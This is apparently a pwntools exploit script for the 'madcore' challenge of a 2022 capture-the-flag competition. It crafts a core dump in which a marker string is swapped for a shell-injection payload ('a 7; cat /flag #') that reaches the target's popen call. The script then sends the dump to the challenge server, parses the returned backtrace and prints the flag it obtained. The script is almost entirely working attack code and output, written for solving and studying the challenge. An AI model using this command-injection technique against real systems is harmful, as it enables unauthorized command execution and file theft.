#!/usr/bin/env python3
import json
from pwn import *

HOST, PORT = "madcore.2022.ctfcompetition.com 1337".split()

exe = context.binary = ELF('madcore')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(args.get("HOST", HOST), args.get("PORT", PORT))
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
tbreak main
b GetFileName
b GetMappedRegisterSet
b popen
continue
'''.format(**locals())

size = 0x1000000

io = start()

with open(args.get("CORE", "core"), "rb") as coredump:
    data = bytearray(coredump.read())

to_replace = b"A"*64
lngth = len(to_replace)
if args.REMOTE:
    payload =  b"a 7; cat /flag #"
else:
    payload =  b"a 7; cat flag #"
payload = payload.ljust(lngth, b"a")
data = data.replace(to_replace, payload)
data_len = len(data)
assert data_len < size
log.info(f"len: {data_len}")
io.send(data)
io.send(b"\x00"*(size-data_len))
io.recvuntil(b"FINISHED READING.\n", drop=True)

res = b""
if not args.REMOTE:
    prefix = b"{\"backtrace\""
    io.recvuntil(prefix)
    res += prefix

res += io.recvall(timeout=2)
trace = json.loads(res)
for value in trace["backtrace"]:
    if "CTF" not in value[1]:
        continue
    log.success(f"got flag: {value[1]}")
io.close()

# https://www.gabriel.urdhr.fr/2015/05/29/core-file/
# [+] got flag: CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}
